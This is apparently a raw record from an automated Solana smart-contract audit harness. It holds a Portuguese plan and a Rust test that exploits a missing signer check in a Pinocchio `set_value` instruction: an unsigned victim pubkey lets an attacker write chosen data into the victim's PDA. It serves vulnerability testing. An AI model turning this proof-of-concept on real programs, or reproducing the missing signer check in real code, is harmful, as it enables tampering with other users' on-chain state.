attempts.raw:
{
  "plan": "O programa `set_value` (Pinocchio) grava a pubkey de `accounts[1]` (user) e um `value` em um PDA derivado de `[b"data", user.key(), bump]`, sem exigir que `user` assine. O baseline usa um `user` legitimo que assina, com o PDA correto, e deve ter sucesso. O ataque repete a mesma instrucao com a pubkey de um usuario vitima como `accounts[1]`, mas sem que essa conta assine (apenas o atacante paga a transacao), gravando o `value` escolhido pelo atacante no estado associado a vitima. O efeito medido e que o PDA da vitima contem a pubkey da vitima e o `value` do atacante, apesar de a vitima nunca ter assinado.",
  "scenario": "let program_id = env.program_id;

// Conta de dados PDA para o usuario legitimo (que assina no baseline)
let legit_user = Pubkey::new_unique();
let (legit_pda, legit_bump) = Pubkey::find_program_address(&[b"data", legit_user.as_ref()], &program_id);

// Conta de dados PDA para a vitima (nao assina no ataque)
let victim = Pubkey::new_unique();
let (victim_pda, victim_bump) = Pubkey::find_program_address(&[b"data", victim.as_ref()], &program_id);

// Baseline: uso legitimo, o user assina
let legit_value: u64 = 111;
let mut legit_ix_data = Vec::new();
legit_ix_data.push(0u8); // IX_SET_VALUE
legit_ix_data.push(legit_bump);
legit_ix_data.extend_from_slice(&legit_value.to_le_bytes());

let legit_ix = env.raw_ix(
    &legit_ix_data,
    &[
        AccountMeta::new(legit_pda, false),
        AccountMeta::new_readonly(legit_user, true),
    ],
);

let legit_accounts = vec![
    (legit_pda, account(&program_id, &[0u8; 49], None)),
    (legit_user, wallet(1_000_000_000)),
];

let baseline = env.baseline("set_value legitimo com user assinando", &legit_ix, &legit_accounts);

// Ataque: mesma instrucao, mas a vitima nao assina
let attack_value: u64 = 999_999;
let mut attack_ix_data = Vec::new();
attack_ix_data.push(0u8);
attack_ix_data.push(victim_bump);
attack_ix_data.extend_from_slice(&attack_value.to_le_bytes());

let attack_ix = env.raw_ix(
    &attack_ix_data,
    &[
        AccountMeta::new(victim_pda, false),
        AccountMeta::new_readonly(victim, false), // NAO assina
    ],
);

let attack_accounts = vec![
    (victim_pda, account(&program_id, &[0u8; 49], None)),
    (victim, wallet(1_000_000_000)),
];

let r = env.attack("set_value com user vitima sem assinatura", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let victim_data = after(&r, &victim_pda).data();
    let stored_user = read_pubkey(victim_data, 8);
    let stored_value = read_u64(victim_data, 40);
    env.effect(
        "PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura",
        stored_user == victim && stored_value == attack_value,
    );
}
"
}

